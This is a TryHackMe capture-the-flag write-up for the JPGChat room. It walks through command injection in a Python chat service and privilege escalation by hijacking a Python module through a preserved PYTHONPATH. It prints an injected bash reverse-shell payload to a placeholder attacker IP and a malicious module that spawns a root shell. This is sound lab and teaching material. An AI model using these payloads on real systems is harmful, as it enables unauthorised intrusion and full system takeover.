# JPGChat — TryHackMe Writeup

**Room:** https://tryhackme.com/room/jpgchat
**Difficulty:** Easy
**Category:** OSINT · Source Code Review · OS Command Injection · Python Module Hijacking

> *"Exploiting poorly made custom chatting service written in a certain language…"*

---

## Flags

| Flag | Value |
|------|-------|
| user.txt | `JPC{█████████████████████████████████████████}` |
| root.txt | `JPC{█████████████████████████████████████████}` |

---

## 1. Reconnaissance

### Nmap Scan

```bash
nmap -Pn -sV 10.10.95.194 -T4

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.10
3000/tcp open  ppp?
```

Two ports: SSH on 22 and something unknown on **port 3000**. The room logo and description hint at Python. Connecting directly with netcat reveals what's actually running there:

```bash
nc 10.10.95.194 3000
```

```
Welcome to JPChat
the source code of this service can be found at our admin's github
MESSAGE USAGE: use [MESSAGE] to message the (currently) only channel
REPORT USAGE: use [REPORT] to report someone to the admins (2-4 hours response)
```

A custom chat service with two commands: `[MESSAGE]` and `[REPORT]`.

---

## 2. OSINT — Finding the Source Code

The banner mentions the source code is on "the admin's github." A quick GitHub search for **JPGChat** finds the repository. The relevant code is in the chat service script:

```python
#!/usr/bin/env python3

import os

print('Welcome to JPChat')
print('the source code of this service can be found at our admin\'s github')

def chatting_service():
    print('MESSAGE USAGE: use [MESSAGE] to message the (currently) only channel')
    print('REPORT USAGE: use [REPORT] to report someone to the admins (2-4 hours response)')

    while True:
        msg = input('')

        if msg == '[MESSAGE]':
            print('There are currently 0 users in this channel')
            while True:
                message = input('[MESSAGE] ')
                if message == '[REPORT]':
                    report_form()
                    break

        if msg == '[REPORT]':
            report_form()

def report_form():
    print('this report will be read by Mozzie-jpg')
    your_name = input('your name: ')
    your_report = input('your report: ')
    os.system("bash -c 'echo %s | tee /opt/jpchat/logs/report.txt'" % your_report)

chatting_service()
```

The vulnerability is immediately obvious: `report_form()` passes `your_report` directly into `os.system()` via string interpolation with `%s`. This is textbook **OS command injection**.

---

## 3. Foothold — Command Injection via `[REPORT]`

### Testing the Injection

Connect to the service and navigate to the report form:

```
nc 10.10.95.194 3000

Welcome to JPChat
[REPORT]
this report will be read by Mozzie-jpg
your name: test
your report: test'; id; echo '
```

```
uid=1000(wes) gid=1000(wes) groups=1000(wes)
```

Arbitrary command execution confirmed as user `wes`.

### Getting a Reverse Shell

Start a netcat listener:

```bash
nc -lnvp 4444
```

Inject a reverse shell payload into the report field. The payload is wrapped to break out of the `echo '...'` context cleanly:

```
your report: test';bash -i >& /dev/tcp/YOUR_IP/4444 0>&1;echo '
```

Shell connects back:

```bash
listening on [any] 4444 ...
connect to [YOUR_IP] from jpgchat.thm [10.10.95.194] 52412
wes@ubuntu-xenial:~$
```

Grab the user flag:

```bash
wes@ubuntu-xenial:~$ cat user.txt
```

**user.txt:** `JPC{█████████████████████████████████████████}`

---

## 4. Enumeration — sudo and test_module.py

Check sudo permissions:

```bash
wes@ubuntu-xenial:~$ sudo -l
Matching Defaults entries for wes on ubuntu-xenial:
    mail_badpass, env_keep+=PYTHONPATH

User wes may run the following commands on ubuntu-xenial:
    (root) NOPASSWD: /usr/bin/python3 /home/wes/test_module.py
```

Two critical observations:
1. `wes` can run `test_module.py` as root with no password.
2. **`PYTHONPATH` is preserved** — `env_keep+=PYTHONPATH` means any `PYTHONPATH` we set in our environment carries over into the root-privileged Python execution.

Read the script:

```bash
wes@ubuntu-xenial:~$ cat /home/wes/test_module.py
```

```python
#!/usr/bin/env python3

from compare import *

print(compare.Str('hello', 'hello', 'hello'))
```

It imports a module called `compare`. This module is **not** a standard Python library — it must be resolved at runtime. If we can place a fake `compare.py` in a directory that appears in `PYTHONPATH` before the real one, our code runs as root.

---

## 5. Privilege Escalation — Python Module Hijacking

### Create the Malicious Module

Write a `compare.py` that spawns a root shell:

```bash
wes@ubuntu-xenial:~$ cat > /tmp/compare.py << 'EOF'
import os
os.system('/bin/bash')
EOF
```

### Set PYTHONPATH and Execute

```bash
wes@ubuntu-xenial:~$ export PYTHONPATH=/tmp
wes@ubuntu-xenial:~$ sudo /usr/bin/python3 /home/wes/test_module.py
```

```
root@ubuntu-xenial:/home/wes# whoami
root
root@ubuntu-xenial:/home/wes# id
uid=0(root) gid=0(root) groups=0(root)
```

Root shell obtained. Grab the root flag:

```bash
root@ubuntu-xenial:~# cat /root/root.txt
```

**root.txt:** `JPC{█████████████████████████████████████████}`

---

## Key Learnings

- **`os.system()` with unsanitised string interpolation is always injectable** — the `%s` format directly into a shell command string allows breaking out with `;`, `&&`, `||`, or backticks. Any user-controlled input into `os.system`, `subprocess.call(shell=True)`, or similar is RCE waiting to happen.
- **Read the source code before attacking** — the banner said "source code is on our admin's github." One search later, the entire vulnerability was visible before sending a single packet. OSINT and code review are faster than blind fuzzing.
- **`env_keep+=PYTHONPATH` in sudoers is a privesc path** — when sudo preserves `PYTHONPATH`, the operator controls where Python looks for modules before checking the standard library. Placing a malicious module at that path under a writeable directory gives full code execution as root.
- **Non-standard module imports in sudo scripts are hijackable** — `from compare import *` resolves at runtime. If `compare` isn't in the standard library and the module search path is attacker-controlled, the import is hijackable. Always verify module origins in scripts that run with elevated privileges.
- **Netcat is the right tool for unknown ports** — the Nmap scan showed `ppp?` on 3000 because it couldn't fingerprint the service. A plain `nc` connection revealed the chat service immediately. When Nmap doesn't recognise a service, just connect to it manually.

## Conclusion

JPGChat is a focused room that chains two clean techniques: OS command injection through Python's `os.system()` with unescaped string formatting, followed by Python module hijacking via a preserved `PYTHONPATH` in sudoers. Both are real vulnerability classes with significant real-world prevalence. The OSINT step — reading the source code from the admin's GitHub — is a satisfying touch that teaches the habit of looking for publicly exposed codebases before attempting blind exploitation. The room is short but the lessons are dense.
